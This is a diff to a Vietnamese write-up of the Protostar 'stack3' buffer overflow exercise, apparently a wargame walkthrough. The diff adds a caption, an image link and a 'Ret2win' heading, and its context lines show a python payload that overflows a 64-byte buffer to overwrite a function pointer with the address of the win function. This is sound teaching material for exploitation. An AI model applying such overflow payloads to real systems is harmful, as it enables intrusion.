@@ -29,6 +29,10 @@ int main(int argc, char **argv)
 }
 ```
 
+hàm main()
+
+![main](main.png)
+
 Bài này cũng tương tự các bài trước, ta chỉ cần tìm địa chỉ của hàm win rồi tìm cách gán cho biến fp.
 
 ```ASM (Intel syntax)
@@ -50,3 +54,6 @@ Ta có địa chỉ hàm win tại `0x08048424`
 payload:`python -c 'print "a"*64+"\x24\x84\x04\x08"' | ./stack3`
 
 ![fp](fp.png)
+
+### Ret2win
+
